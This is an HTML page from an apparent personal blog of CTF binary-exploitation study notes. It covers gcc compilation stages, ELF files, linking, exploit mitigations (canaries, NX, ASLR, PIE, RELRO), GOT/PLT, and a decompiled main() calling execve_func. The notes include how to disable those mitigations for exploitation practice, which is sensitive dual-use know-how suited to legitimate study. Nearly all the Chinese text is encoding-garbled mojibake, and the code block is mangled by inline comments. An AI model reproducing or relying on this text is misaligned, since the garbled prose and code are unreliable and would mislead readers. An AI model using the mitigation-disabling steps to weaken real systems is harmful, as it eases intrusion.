<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="gcc hello.c -save-temps &ndash;verbose\n-save-temps‰øùÂ≠ò‰∏≠Èó¥ÁîüÊàêÊñá‰ª∂\n&ndash;verboseÊü•ÁúãËØ¶ÁªÜÂ∑•ÂÖ∑ÊµÅ\nÈ¢ÑÂ§ÑÁêÜ gcc -E hello.c -o hello.i\nÁºñËØë gcc -S hello.c -o hello.s\nÊ±áÁºñ gcc -c hello.s -o hello.o\nÈáçÂÆöÂêëÊñá‰ª∂\nÂèçÊ±áÁºñ\n">
<title>ctfshow-pwn</title>

<link rel='canonical' href='https://Frederick2313072.github.io/p/ctfshow-pwn/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="ctfshow-pwn">
<meta property='og:description' content="gcc hello.c -save-temps &ndash;verbose\n-save-temps‰øùÂ≠ò‰∏≠Èó¥ÁîüÊàêÊñá‰ª∂\n&ndash;verboseÊü•ÁúãËØ¶ÁªÜÂ∑•ÂÖ∑ÊµÅ\nÈ¢ÑÂ§ÑÁêÜ gcc -E hello.c -o hello.i\nÁºñËØë gcc -S hello.c -o hello.s\nÊ±áÁºñ gcc -c hello.s -o hello.o\nÈáçÂÆöÂêëÊñá‰ª∂\nÂèçÊ±áÁºñ\n">
<meta property='og:url' content='https://Frederick2313072.github.io/p/ctfshow-pwn/'>
<meta property='og:site_name' content='Frederick'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-03-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-23T01:18:06&#43;08:00'/>
<meta name="twitter:title" content="ctfshow-pwn">
<meta name="twitter:description" content="gcc hello.c -save-temps &ndash;verbose\n-save-temps‰øùÂ≠ò‰∏≠Èó¥ÁîüÊàêÊñá‰ª∂\n&ndash;verboseÊü•ÁúãËØ¶ÁªÜÂ∑•ÂÖ∑ÊµÅ\nÈ¢ÑÂ§ÑÁêÜ gcc -E hello.c -o hello.i\nÁºñËØë gcc -S hello.c -o hello.s\nÊ±áÁºñ gcc -c hello.s -o hello.o\nÈáçÂÆöÂêëÊñá‰ª∂\nÂèçÊ±áÁºñ\n">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "dark");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="ÂàáÊç¢ËèúÂçï">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_db8ca5b2d3391751.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üêã</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Frederick</a></h1>
            <h2 class="site-description">Welcome to my alter ego&#39;s site!</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/Frederick2313072'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>‰∏ªÈ°µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/resources/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Resources</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ÁõÆÂΩï</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#elfÊñá‰ª∂">ELFÊñá‰ª∂</a>
      <ol>
        <li><a href="#ÁªìÊûÑ">ÁªìÊûÑ</a></li>
      </ol>
    </li>
    <li><a href="#ÂèØÊâßË°åÊñá‰ª∂ÁöÑË£ÖËΩΩ">ÂèØÊâßË°åÊñá‰ª∂ÁöÑË£ÖËΩΩ</a>
      <ol>
        <li><a href="#Âú∞ÂùÄÁ©∫Èó¥ÂàÜÈÖç">Âú∞ÂùÄÁ©∫Èó¥ÂàÜÈÖç</a></li>
        <li><a href="#ÈùôÊÄÅÈìæÊé•ÁöÑËØ¶ÁªÜËøáÁ®ã">ÈùôÊÄÅÈìæÊé•ÁöÑËØ¶ÁªÜËøáÁ®ã</a></li>
        <li><a href="#Âä®ÊÄÅÈìæÊé•">Âä®ÊÄÅÈìæÊé•</a></li>
      </ol>
    </li>
    <li><a href="#stack-canaries">Stack Canaries</a></li>
    <li><a href="#nx">NX</a></li>
    <li><a href="#aslr">ASLR</a></li>
    <li><a href="#pie">PIE</a></li>
    <li><a href="#full-relro">Full Relro</a></li>
    <li><a href="#gotpltÂíåpltÁöÑ‰ΩúÁî®">.GOT.PLTÂíå.PLTÁöÑ‰ΩúÁî®</a></li>
    <li><a href="#ÈìæÊé•ÈáçÂÆö‰Ωç">ÈìæÊé•ÈáçÂÆö‰Ωç</a></li>
    <li><a href="#pwn24">pwn24</a></li>
    <li><a href="#pwn25">pwn25</a></li>
    <li><a href="#pwn26">pwn26</a></li>
    <li><a href="#pwn29">pwn29</a></li>
    <li><a href="#pwn30">pwn30</a></li>
    <li><a href="#pwn32">pwn32</a>
      <ol>
        <li><a href="#ÂØπÂáΩÊï∞ÁöÑËß£Èáä">ÂØπÂáΩÊï∞ÁöÑËß£Èáä</a></li>
      </ol>
    </li>
    <li><a href="#pwn33">pwn33</a></li>
    <li><a href="#pwn34">pwn34</a></li>
    <li><a href="#pwn35">pwn35</a></li>
    <li><a href="#pwn36">pwn36</a></li>
    <li><a href="#pwn37">pwn37</a></li>
    <li><a href="#pwn38">pwn38</a></li>
    <li><a href="#pwn39">pwn39</a></li>
    <li><a href="#pwn94">pwn94</a></li>
    <li><a href="#pwn95">pwn95</a></li>
    <li><a href="#pwn96">pwn96</a></li>
    <li><a href="#pwn101">pwn101</a></li>
    <li><a href="#pwn102">pwn102</a></li>
    <li><a href="#pwn105">pwn105</a></li>
    <li><a href="#pwn107">pwn107</a></li>
    <li><a href="#pwn41">pwn41</a></li>
    <li><a href="#pwn42">pwn42</a></li>
    <li><a href="#pwn43">pwn43</a></li>
    <li><a href="#pwn44">pwn44</a></li>
    <li><a href="#pwn45">pwn45</a></li>
    <li><a href="#pwn47">pwn47</a></li>
    <li><a href="#pwn48">pwn48</a></li>
    <li><a href="#pwn49">pwn49</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/ctfshow-pwn/">ctfshow-pwn</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-03-15</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>gcc hello.c -save-temps &ndash;verbose</p>
<p>-save-temps‰øùÂ≠ò‰∏≠Èó¥ÁîüÊàêÊñá‰ª∂</p>
<p>&ndash;verboseÊü•ÁúãËØ¶ÁªÜÂ∑•ÂÖ∑ÊµÅ</p>
<ul>
<li>È¢ÑÂ§ÑÁêÜ</li>
</ul>
<p>gcc -E hello.c -o hello.i</p>
<ul>
<li>ÁºñËØë</li>
</ul>
<p>gcc -S hello.c -o hello.s</p>
<ul>
<li>Ê±áÁºñ</li>
</ul>
<p>gcc -c hello.s -o hello.o</p>
<p>ÈáçÂÆöÂêëÊñá‰ª∂</p>
<p>ÂèçÊ±áÁºñ</p>
<p>objdump -sd hello.o -M intel</p>
<ul>
<li>ÈìæÊé•</li>
</ul>
<p>gcc hello.o -o hello -static</p>
<p>ÈªòËÆ§Âä®ÊÄÅÔºå-staticÊåáÂÆöÈùôÊÄÅÈìæÊé•</p>
<p>objdump -sd hello -M intel</p>
<p>-M intel</p>
<ul>
<li>ÊåáÂÆöÂèçÊ±áÁºñÁöÑËæìÂá∫Ê†ºÂºè‰∏∫ Intel ËØ≠Ê≥ïÔºàËÄå‰∏çÊòØÈªòËÆ§ÁöÑ AT&amp;T ËØ≠Ê≥ïÔºâ„ÄÇ</li>
<li>Intel ËØ≠Ê≥ïÊòØÊ±áÁºñËØ≠Ë®ÄÁöÑ‰∏ÄÁßçÂ∏∏ËßÅÊ†ºÂºèÔºåÈÄöÂ∏∏Êõ¥Êòì‰∫éÈòÖËØª„ÄÇ</li>
</ul>
<p>-s ÈÄâÈ°π</p>
<ul>
<li>ÊòæÁ§∫Êñá‰ª∂ÁöÑÂÆåÊï¥ÂÜÖÂÆπÔºàÂåÖÊã¨ÂçÅÂÖ≠ËøõÂà∂Âíå ASCII Ë°®Á§∫Ôºâ„ÄÇ</li>
</ul>
<ul>
<li>‰æãÂ¶ÇÔºåÂÆÉ‰ºöÊòæÁ§∫ÊØè‰∏™ÊÆµÁöÑÂçÅÂÖ≠ËøõÂà∂Êï∞ÊçÆ‰ª•ÂèäÂØπÂ∫îÁöÑ ASCII Â≠óÁ¨¶„ÄÇ</li>
</ul>
<p>-d ÈÄâÈ°π</p>
<ul>
<li>ÂèçÊ±áÁºñÊñá‰ª∂‰∏≠ÁöÑÂèØÊâßË°å‰ª£Á†ÅÊÆµ„ÄÇ</li>
<li>‰æãÂ¶ÇÔºåÂÆÉ‰ºöÂ∞Ü‰∫åËøõÂà∂‰ª£Á†ÅËΩ¨Êç¢‰∏∫Ê±áÁºñÊåá‰ª§„ÄÇ</li>
</ul>
<h2 id="elfÊñá‰ª∂">ELFÊñá‰ª∂
</h2><p>ÂèØÊâßË°åÊñá‰ª∂.exec</p>
<p>ÂèØÈáçÂÆö‰ΩçÊñá‰ª∂ÔºåÂ∞öÊú™ÈìæÊé• .rel</p>
<p>ÂÖ±‰∫´ÁõÆÊ†áÊñá‰ª∂ÔºöÂä®ÊÄÅÈìæÊé•Â∫ìÊñá‰ª∂.dyc</p>
<h3 id="ÁªìÊûÑ">ÁªìÊûÑ
</h3><ul>
<li>Êñá‰ª∂Â§¥</li>
</ul>
<p><img src="/p/ctfshow-pwn/image-20250227214747649.png"
	width="1848"
	height="866"
	srcset="/p/ctfshow-pwn/image-20250227214747649_hu_bd3246baed0aea0.png 480w, /p/ctfshow-pwn/image-20250227214747649_hu_1753cc623b7357cf.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="213"
		data-flex-basis="512px"
	
></p>
<ul>
<li>ËäÇÂ§¥Ë°®</li>
</ul>
<p><img src="/p/ctfshow-pwn/image-20250227214822812.png"
	width="1761"
	height="1546"
	srcset="/p/ctfshow-pwn/image-20250227214822812_hu_b3694f475a400218.png 480w, /p/ctfshow-pwn/image-20250227214822812_hu_c6105248afb08909.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="113"
		data-flex-basis="273px"
	
></p>
<p>.text</p>
<p>.data</p>
<p>.bss</p>
<h2 id="ÂèØÊâßË°åÊñá‰ª∂ÁöÑË£ÖËΩΩ">ÂèØÊâßË°åÊñá‰ª∂ÁöÑË£ÖËΩΩ
</h2><p>ËøêË°å‰∏Ä‰∏™ÂèØÊâßË°åÊñá‰ª∂Êó∂ÔºåÈúÄË¶ÅÂ∞ÜËØ•Êñá‰ª∂ÂíåÂä®ÊÄÅÈìæÊé•Â∫ìË£ÖËΩΩÂà∞ËøõÁ®ãÁ©∫Èó¥‰∏≠ÔºåÂΩ¢Êàê‰∏Ä‰∏™ËøõÁ®ãÈïúÂÉèÔºåÊØè‰∏™ËøõÁ®ãÈÉΩÊã•ÊúâÁã¨Á´ãÁöÑËôöÊãüÂú∞ÂùÄÁ©∫Èó¥ÔºåËøô‰∏™Á©∫Èó¥Êó•ÂíåÂ∏ÉÂ±ÄÊòØÁî±ËÆ∞ÂΩïÂú®ÊÆµÂ§¥Ë°®ÁöÑÁ®ãÂ∫èÂ§¥ÂÜ≥ÂÆöÁöÑ</p>
<p><img src="/p/ctfshow-pwn/image-20250227221024347.png"
	width="1787"
	height="1528"
	srcset="/p/ctfshow-pwn/image-20250227221024347_hu_f22177dcc3fe806.png 480w, /p/ctfshow-pwn/image-20250227221024347_hu_15f9ab4491825f4a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="116"
		data-flex-basis="280px"
	
></p>
<h3 id="Âú∞ÂùÄÁ©∫Èó¥ÂàÜÈÖç">Âú∞ÂùÄÁ©∫Èó¥ÂàÜÈÖç
</h3><p>Áõ∏‰ººËäÇÂêàÂπ∂</p>
<h3 id="ÈùôÊÄÅÈìæÊé•ÁöÑËØ¶ÁªÜËøáÁ®ã">ÈùôÊÄÅÈìæÊé•ÁöÑËØ¶ÁªÜËøáÁ®ã
</h3><p>Á¨¶Âè∑Ëß£ÊûêÔºöÊØè‰∏™Á¨¶Âè∑ÔºàÂáΩÊï∞ÔºåÂèòÈáèÔºâ‰∏éÂÆö‰πâÂÖ≥ËÅî</p>
<p>ÈáçÂÆö‰ΩçÔºöÊØè‰∏™Á¨¶Âè∑ÂÆö‰πâ‰∏éÂÜÖÂ≠òÂú∞ÂùÄÂÖ≥ËÅî</p>
<p>ÈùôÊÄÅÈìæÊé•Â∫ìÔºö.a</p>
<h3 id="Âä®ÊÄÅÈìæÊé•">Âä®ÊÄÅÈìæÊé•
</h3><p>Âú®ËøêË°åÊàñÂä†ËΩΩÊó∂ÔºåÂú®ÂÜÖÂ≠ò‰∏≠ÂÆåÊàêÈìæÊé•ÁöÑËøáÁ®ãÔºåÁî®‰∫éÂä®ÊÄÅËøûÊé•ÁöÑÁ≥ªÁªüÂ∫ìÂè´ÂÖ±‰∫´Â∫ì</p>
<p>Â¶Çfuncq.elfÂíåfunc2.elf‰∏çÂÜçÂåÖÂê´ÂçïÁã¨ÁöÑtestlib.oÔºåËøêË°åfunc1.elfÊó∂ÔºåÁ≥ªÁªüÂ∞Üfunc1.elfÂíå‰æùËµñÁöÑtestlib.oË£ÖËΩΩÂ¶ÇÂÜÖÂ≠òÔºåÁÑ∂ÂêéËøõË°åÂä®ÊÄÅÈìæÊé•ÔºåÂÆåÊàêÂêéÁ≥ªÁªüÂ∞ÜÊéßÂà∂ÊùÉ‰∫§ÁªôÁ®ãÂ∫èÂÖ•Âè£ÁÇπÔºåÂΩìfunc2.elfÊÉ≥Ë¶ÅÊâßË°åÊó∂ÔºåÁî±‰∫éÂÜÖÂ≠ò‰∏≠Â∑≤ÁªèÊúâtestlib.o,Âõ†Ê≠§‰∏çÂÜçÈáçÂ§çÂä†ËΩΩ</p>
<h2 id="stack-canaries">Stack Canaries
</h2><p>canaryÁöÑÂÄºÊòØÊ†à‰∏äÁöÑ‰∏Ä‰∏™ÈöèÊú∫Êï∞ÔºåÂú®Á®ãÂ∫èÂêØÂä®Êó∂ÈöèÊú∫ÁîüÊàêÂπ∂‰øùÂ≠òÂú®ÊØîÂáΩÊï∞ËøîÂõûÂú∞ÂùÄÊõ¥‰ΩéÁöÑÂú∞ÊñπÔºåÊîªÂáªËÄÖË¶ÅÊÉ≥ÊéßÂà∂ÂáΩÊï∞ÁöÑËøîÂõûÊåáÈíàÔºåÂ∞±‰∏ÄÂÆöË¶ÅÂÖàË¶ÜÁõñÂà∞canary,Â¶ÇÊûúË¢´ÊîπÂèòÔºåÂàôËÆ§‰∏∫ÊòØÂèëÁîü‰∫ÜÊ†àÊ∫¢Âá∫</p>
<p>gccÈªòËÆ§‰ΩøÁî®stack canary‰øùÊä§ÔºåÂÖ≥Èó≠ÊñπÊ≥ïÂä†ÂÖ•‚Äú-fno-stack-protector‚Äù</p>
<h2 id="nx">NX
</h2><p>ÂºÄÂêØNX‰øùÊä§‰∏çËÉΩÁõ¥Êé•‰ΩøÁî®shellcodeÊâßË°å‰ªªÊÑè‰ª£Á†ÅÔºågccÈªòËÆ§ÂºÄÂêØÔºåÂÖ≥Èó≠ÊñπÊ≥ïÂä†-z execstack</p>
<h2 id="aslr">ASLR
</h2><p>Â∞ÜÁ®ãÂ∫èÁöÑÂ†ÜÊ†àÂú∞ÂùÄÂíåÂä®ÊÄÅÈìæÊé•Â∫ìÁöÑÂä†ËΩΩÂú∞ÂùÄËøõË°å‰∏ÄÂÆöÁöÑÈöèÊú∫ÂåñÔºåËøô‰∫õÂú∞ÂùÄ‰πãÈó¥ÊòØ‰∏çÂèØËØªÂÜôÊâßË°åÁöÑÊú™Êò†Â∞ÑÂÜÖÂ≠òÔºåÈôç‰ΩéÊîªÂáªËÄÖÂØπÁ®ãÂ∫èÂÜÖÂ≠òÁªìÊûÑÁöÑ‰∫ÜËß£Á®ãÂ∫è</p>
<p><img src="/p/ctfshow-pwn/image-20250228141347980.png"
	width="1272"
	height="1113"
	srcset="/p/ctfshow-pwn/image-20250228141347980_hu_99dd4e2ad0380f47.png 480w, /p/ctfshow-pwn/image-20250228141347980_hu_494897763b3705d8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="114"
		data-flex-basis="274px"
	
></p>
<p>ÂÖ≥Èó≠ÊñπÂºèÔºå‰øÆÊîπ/proc/sys/kernel/randomize_va_spaceÊñá‰ª∂ÁöÑÂÜÖÂÆπ‰∏∫0</p>
<h2 id="pie">PIE
</h2><p>ËÆ©ELFÂú∞ÂùÄÈöèÊú∫ÂåñÂä†ËΩΩÔºå‰ΩøÂæóÁ®ãÂ∫èÁöÑÂÜÖÂ≠òÁªìÊûÑÂØπÊîªÂáªËÄÖÊú™Áü•ÔºåËøõ‰∏ÄÊ≠•ÊèêÈ´òÁ®ãÂ∫èÁöÑÂÆâÂÖ®ÊÄß</p>
<p>ÂºÄÂêØ-fpic-pie</p>
<p>ÂÖ≥Èó≠-no-pie</p>
<h2 id="full-relro">Full Relro
</h2><p>ÂºÄÂêØ‚Äú-z relro‚Äù</p>
<h2 id="gotpltÂíåpltÁöÑ‰ΩúÁî®">.GOT.PLTÂíå.PLTÁöÑ‰ΩúÁî®
</h2><p>‰∏Ä‰∏™Á®ãÂ∫èÊÉ≥Ë∞ÉÁî®Âä®ÊÄÅÈìæÊé•Â∫ì‰∏≠ÁöÑÂáΩÊï∞ÔºåÂøÖÈ°ª‰ΩøÁî®.GOT.PLTÂíå.PLTÈÖçÂêàÂÆåÊàêË∞ÉÁî®</p>
<p>.PLTË°®ÊòØ‰∏ÄÊÆµ‰ª£Á†ÅÔºå‰ªéÂÜÖÂ≠ò‰∏≠ÂèñÂá∫‰∏Ä‰∏™Âú∞ÂùÄÁÑ∂ÂêéË∑≥ËΩ¨</p>
<p>.GOT.PLTË°®Â≠òÊîæÂÆûÈôÖÂú∞ÂùÄ</p>
<p>Áî±‰∫éLinuxÁöÑLazy bindingÊú∫Âà∂ÔºåÊ≤°ÊúâÂºÄÂêØFull RelloÁöÑELFÁßçÔºåÊüê‰∏™ÂáΩÊï∞ÂøÖÈ°ªË¢´Ë∞ÉÁî®Ôºå.GOT.PLTË°®Êâç‰ºöÂ≠òÊîæÂáΩÊï∞ÁöÑÁúüÂÆûÂú∞ÂùÄ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span><span class="err">`</span><span class="p">:</span> <span class="err">ËøôÊòØ</span> <span class="err">`</span><span class="n">main</span><span class="err">`</span> <span class="err">ÂáΩÊï∞ÁöÑÂÆö‰πâÔºåÂÆÉÊé•Âèó‰∏â‰∏™ÂèÇÊï∞ÔºåÂàÜÂà´ÊòØÁ®ãÂ∫èÁöÑÂèÇÊï∞Êï∞Èáè</span> <span class="err">`</span><span class="n">argc</span><span class="err">`„ÄÅÂèÇÊï∞ÂàóË°®</span> <span class="err">`</span><span class="n">argv</span><span class="err">`</span> <span class="err">ÂíåÁéØÂ¢ÉÂèòÈáè</span> <span class="err">`</span><span class="n">envp</span>
</span></span><span class="line"><span class="cl"><span class="n">v6</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">);:</span> <span class="err">Ëøô‰∏ÄË°åËØªÂèñ‰∫Ü</span> <span class="n">FS</span> <span class="err">ÂØÑÂ≠òÂô®ÂÅèÁßª</span> <span class="mh">0x28</span> <span class="err">Â§ÑÁöÑÂÄºÂπ∂Â≠òÂÇ®Âà∞</span> <span class="n">v6</span> <span class="err">‰∏≠</span>
</span></span><span class="line"><span class="cl"><span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">);</span> <span class="err">Âíå</span> <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">);:</span> <span class="err">Ëøô‰∏§Ë°åË∞ÉÁî®‰∫Ü</span> <span class="n">setvbuf</span> <span class="err">ÂáΩÊï∞ÔºåÁî®‰∫éËÆæÁΩÆÁºìÂÜ≤Âå∫Á±ªÂûã„ÄÇÁ¨¨‰∏Ä‰∏™Ë∞ÉÁî®Â∞Ü</span> <span class="n">_bss_start</span> <span class="err">ÁöÑÁºìÂÜ≤Âå∫Á±ªÂûãËÆæÁΩÆ‰∏∫Êó†ÁºìÂÜ≤ÔºåÁ¨¨‰∫å‰∏™Ë∞ÉÁî®Â∞ÜÊ†áÂáÜËæìÂÖ•ÁöÑÁºìÂÜ≤Âå∫Á±ªÂûãËÆæÁΩÆ‰∏∫Êó†ÁºìÂÜ≤„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="n">strcpy</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s2">&#34;CTFshowPWN&#34;</span><span class="p">);:</span> <span class="err">ËøôË°åÂ∞ÜÂ≠óÁ¨¶‰∏≤</span> <span class="s2">&#34;CTFshowPWN&#34;</span> <span class="err">Â§çÂà∂Âà∞</span> <span class="n">s1</span> <span class="err">Êï∞ÁªÑ‰∏≠</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">)</span> <span class="p">)</span> <span class="n">execve_func</span><span class="p">();:</span> <span class="err">ËøôË°å‰ΩøÁî®</span> <span class="n">strcmp</span> <span class="err">ÂáΩÊï∞ÊØîËæÉ</span> <span class="n">s1</span> <span class="err">Âíå</span> <span class="n">s2</span> <span class="err">ÊòØÂê¶Áõ∏Á≠âÔºåÂ¶ÇÊûúÁõ∏Á≠âÔºåÂàôË∞ÉÁî®</span> <span class="n">execve_func</span> <span class="err">ÂáΩÊï∞„ÄÇ</span>
